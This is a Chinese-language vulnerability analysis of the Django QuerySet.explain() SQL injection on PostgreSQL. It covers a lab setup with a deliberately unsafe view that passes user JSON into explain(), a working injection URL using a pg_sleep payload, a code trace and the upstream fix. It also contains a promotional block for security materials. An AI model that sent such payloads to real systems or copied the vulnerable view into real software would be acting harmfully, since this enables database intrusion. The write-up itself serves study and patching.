![image](https://image.3001.net/images/20230518/1684399203_6465e4633df1c0174e8cc.png!small)​

## 漏洞简介

在Django 2.2 的 2.2.28 之前版本、3.2 的 3.2.13 之前版本和 4.0 的 4.0.4 之前版本中的
QuerySet.deexplain()
中发现了SQL注入问题。这是通过传递一个精心编制的字典（带有字典扩展）作为**options参数来实现的，并将注入负载放置在选项名称中。

### 影响版本

2.2 =< Django < 2.2.28

3.2 =< Django < 3.2.13

4.0 =< Django < 4.0.4

## 环境搭建

创建存在 漏洞 Django 版本 3.2.12 项目

创建 startapp Demo 并依次修改文件

安装 postgresql 数据库

settings.py 设置连接数据库为 postgresql 数据库

    
    
    DATABASES = {  
      'default': {  
          'ENGINE': 'django.db.backends.postgresql',  
          'NAME': 'test',  
          'USER': 'postgres',  
          'PASSWORD': '123456',  
          'HOST': '127.0.0.1',  
          'PORT': '5432',  
      }  
    }

urls.py 设定对应路由

    
    
    from django.contrib import admin  
    from django.urls import path  
    ​  
    from Demo import views  
    ​  
    urlpatterns = [  
      path('admin/', admin.site.urls),  
      path('index/', views.index),  
      path('demo/', views.users),  
      path('initialize/', views.loadexampledata),  
    ]

models.py

    
    
    from django.db import models  
    ​  
    # Create your models here.  
    class User(models.Model):  
      name = models.CharField(max_length=200)  
    ​  
      def __str__(self):  
          return self.name

views.py

    
    
    import json  
    ​  
    ​  
    from django.http import HttpResponse  
    from django.shortcuts import render  
    ​  
    # Create your views here.  
    from .models import User  
    ​  
    ​  
    ​  
    def index(request):  
      return HttpResponse('hello world')  
    ​  
    def users(request):  
      query = request.GET.get('q')  
      query = json.loads(query)  
      qs = User.objects.get_queryset().explain(**query)  
      return HttpResponse(qs)  
    ​  
    ​  
    def loadexampledata(request):  
      u = User(name="Admin")  
      u.save()  
      u = User(name="Staff1")  
      u.save()  
      u = User(name="Staff12")  
      u.save()  
      return HttpResponse("ok")

‍

## 漏洞复现

    
    
    http://127.0.0.1:8000/demo/?q={"ANALYZE)+select+pg_sleep(5);--+":"aaa"}

![image](https://image.3001.net/images/20230518/1684399204_6465e464d38e495210310.png!small)​

发现成功构造使得服务器沉睡

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 漏洞分析

在进行代码分析之前，我们先了解一个知识点 EXPLAIN

### EXPLAIN

EXPLAIN -- 显示一个语句的执行计划

![image](https://image.3001.net/images/20230518/1684399206_6465e4667bc716be502b3.png!small)​

    
    
    EXPLAIN [ ( option [, ...] ) ] statement  
    EXPLAIN [ ANALYZE ] [ VERBOSE ] statement  
    ​  
    option：  
      ANALYZE [ boolean ]   执行命令并显示实际运行时间  
      VERBOSE [ boolean ]   显示规划树完整的内部表现形式，而不仅是一个摘要  
      COSTS [ boolean ]  
      BUFFERS [ boolean ]  
      TIMING [ boolean ]  
      FORMAT { TEXT | XML | JSON | YAML }  
    ​  
    statement：  
      查询执行计划的 SQL 语句，可以是任何 select、insert、update、delete、values、execute、declare 语句

EXPLAIN ANALYZE不仅会显示查询计划，还会实际运行语句。EXPLAIN
ANALYZE会丢掉任何来自SELECT语句的输出，但是该语句中的其他操作会被执行（例如INSERT、UPDATE或者DELETE）。

### 调试分析

![image](https://image.3001.net/images/20230518/1684399207_6465e467748c3685d6822.png!small)

`django.db.models.query.QuerySet.explain`​

![image](https://image.3001.net/images/20230518/1684399208_6465e468b77747e4f9e08.png!small)

`django.db.models.sql.query.Query.explain`​

![image](https://image.3001.net/images/20230518/1684399209_6465e469db87df2f30a61.png!small)

`django.db.models.sql.compiler.SQLCompiler.explain_query`​

![image](https://image.3001.net/images/20230518/1684399211_6465e46b3bd4e12eac70c.png!small)

`django.db.models.sql.compiler.SQLCompiler.execute_sql`​

![image](https://image.3001.net/images/20230518/1684399212_6465e46c5c04e94321559.png!small)

`django.db.models.sql.compiler.SQLCompiler.as_sql`​

![image](https://image.3001.net/images/20230518/1684399213_6465e46d70f5f9ae94c05.png!small)

在这里会根据所选择的数据库，来调用其相对应的 explain_query_prefix 方法

`django.db.backends.postgresql.operations.DatabaseOperations.explain_query_prefix`​

![image](https://image.3001.net/images/20230518/1684399214_6465e46e88ec5d9c8a7cf.png!small)

`postgresql`​ 中 重写了 explain_query_prefix 方法将键名拼接到了 SQL 语句中

![image](https://image.3001.net/images/20230518/1684399215_6465e46fe11249286e5bb.png!small)

最后执行的 SQL 语句是

    
    
    'EXPLAIN (ANALYZE) SELECT PG_SLEEP(5);--  true) SELECT "Demo_user"."id", "Demo_user"."name" FROM "Demo_user"'

‍

## 漏洞修复

<https://github.com/django/django/commit/00b0fc50e1738c7174c495464a5ef069408a4402#diff-fbd8a517f5fa1333b9f7273bcd007551cd2fb4b8f6732cd6002ba42411802901>

![image](https://image.3001.net/images/20230518/1684399217_6465e4713fc8aec01178d.png!small)

做了一个过滤，发现危险字符就抛出异常

![image](https://image.3001.net/images/20230518/1684399218_6465e472ac8393ba35cd0.png!small)

只有字符串在白名单内才会拼接到语句中

###  **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

